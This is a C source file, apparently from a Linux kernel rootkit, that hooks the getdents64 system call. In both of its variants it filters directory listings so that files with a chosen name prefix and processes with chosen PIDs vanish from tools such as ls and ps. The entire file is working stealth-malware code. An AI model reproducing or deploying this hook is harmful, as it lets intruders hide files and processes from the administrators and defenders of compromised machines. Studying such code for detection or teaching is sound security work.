// Protect order from clang-format for type definitions
// clang-format off
#include <linux/kernel.h>
#include <linux/dirent.h>
// clang-format on

#include "getdents64.h"
#include "../../hide/dirent.h"
#include "../../hide/pid.h"

#ifdef PTREGS_SYSCALL_STUBS
extern asmlinkage long (*orig_getdents64)(const struct pt_regs*);

asmlinkage int hook_getdents64(const struct pt_regs* regs)
{
  // Userspace dirent
  struct linux_dirent64 __user* dirent = (struct linux_dirent64*) regs->si;
  // int fd = regs->di;
  // int count = regs->dx;

  long error;

  struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
  unsigned long offset = 0;

  // Capture original getdents for examining its contents and allocate new buf
  int ret = orig_getdents64(regs);
  dirent_ker = kzalloc(ret, GFP_KERNEL);

  if ((ret <= 0) || (dirent_ker == NULL))
    return ret;

  // Copy userspace to kernel land
  error = copy_from_user(dirent_ker, dirent, ret);
  if (error)
    goto done;

  for (offset = 0; offset < ret; offset += current_dir->d_reclen) {
    current_dir = (void*) dirent_ker + offset;

    if (prefix_match(current_dir->d_name) || pid_match(current_dir->d_name)) {
      // Shift contents over matched dirent
      if (current_dir == dirent_ker) {
        ret -= current_dir->d_reclen;
        memmove(current_dir, (void*) current_dir + current_dir->d_reclen, ret);
        continue;
      }

      // Add to size of dirent to previous
      previous_dir->d_reclen += current_dir->d_reclen;
    } else {
      previous_dir = current_dir;
    }
  }

  // Copy modifications back to userspace
  error = copy_to_user(dirent, dirent_ker, ret);
  if (error)
    goto done;

done:
  kfree(dirent_ker);
  return ret;
}

#else
extern asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64* dirent, unsigned int count);

asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64* dirent, unsigned int count)
{
  struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
  unsigned long offset = 0;

  // Capture original getdents for examining its contents and allocate new buf
  int ret = orig_getdents64(fd, dirent, count);
  dirent_ker = kzalloc(ret, GFP_KERNEL);

  if ((ret <= 0) || (dirent_ker == NULL))
    return ret;

  // Copy userspace to kernel land
  long error;
  error = copy_from_user(dirent_ker, dirent, ret);
  if (error)
    goto done;

  for (offset = 0; offset < ret; offset += current_dir->d_reclen) {
    current_dir = (void*) dirent_ker + offset;

    if (prefix_match(current_dir->d_name) || pid_match(current_dir->d_name)) {
      // Shift contents over matched dirent
      if (current_dir == dirent_ker) {
        ret -= current_dir->d_reclen;
        memmove(current_dir, (void*) current_dir + current_dir->d_reclen, ret);
        continue;
      }

      // Add to size of dirent to previous
      previous_dir->d_reclen += current_dir->d_reclen;
    } else {
      previous_dir = current_dir;
    }
  }

  // Copy modifications back to userspace
  error = copy_to_user(dirent, dirent_ker, ret);
  if (error)
    goto done;

done:
  kfree(dirent_ker);
  return ret;
}

#endif
